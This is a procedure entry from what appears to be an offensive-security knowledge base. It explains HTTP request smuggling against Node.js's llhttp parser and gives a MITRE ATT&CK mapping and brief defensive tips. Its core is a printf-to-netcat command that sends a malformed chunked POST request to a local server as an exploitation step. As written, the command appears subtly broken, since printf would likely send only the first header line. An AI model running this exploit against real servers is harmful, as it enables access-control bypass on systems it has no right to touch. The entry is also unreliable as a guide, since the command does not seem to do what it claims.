---
tags:
  - http-request-smuggling
  - exploitation
type: procedure
tools:
  - '[[tools/printf]]'
  - '[[tools/nc]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/printf-nc-send-malformed-request]]'
platforms:
  - Node.js
  - Web
techniques:
  - '[[Exploit Public-Facing Application]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: a6dcae50-1799-426f-b7d1-40f662110f86
created_at: '2025-12-13T09:01:17.165Z'
updated_at: '2025-12-13T09:01:17.165Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Send Malformed HTTP Request for Smuggling

## Summary

This procedure crafts and sends a malformed HTTP POST request with an obfuscated Transfer-Encoding header to exploit the llhttp parser flaw in Node.js, enabling HTTP Request Smuggling.

## Description

By using a header like 'x:\nTransfer-Encoding: chunked' not properly delimited by CRLF, followed by a chunked body, the request bypasses proper rejection, leading to smuggling. This can result in access control bypass and other issues.

## Requirements

1. Running Node.js server on localhost:5000
2. Access to bash or similar shell
3. printf and nc tools available

## Defense

Defensive measures and detection strategies:

- Implement strict header validation in web servers
- Use WAF to detect malformed requests

## Objectives

1. Exploit the parsing vulnerability
2. Send chunked data that should be rejected
3. Confirm acceptance by the server

## Instructions

### Step 1: Craft and Send Request

**Context**: Format the malformed request and pipe it to the server via netcat.

**Command** ([[commands/printf-nc-send-malformed-request]]):

```bash
printf "POST / HTTP/1.1\r\n" "Host: localhost\r\n" " x:\nTransfer-Encoding: chunked\r\n" "\r\n" "1\r\n" "A\r\n" "0\r\n" "\r\n" | nc localhost 5000
```

> This sends a POST request with obfuscated headers to test smuggling.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques



## Commands Used

- [[commands/printf-nc-send-malformed-request]]

## Tools Used

- [[tools/printf]]
- [[tools/nc]]

## Tags

- [[http-request-smuggling]]
- [[exploitation]]
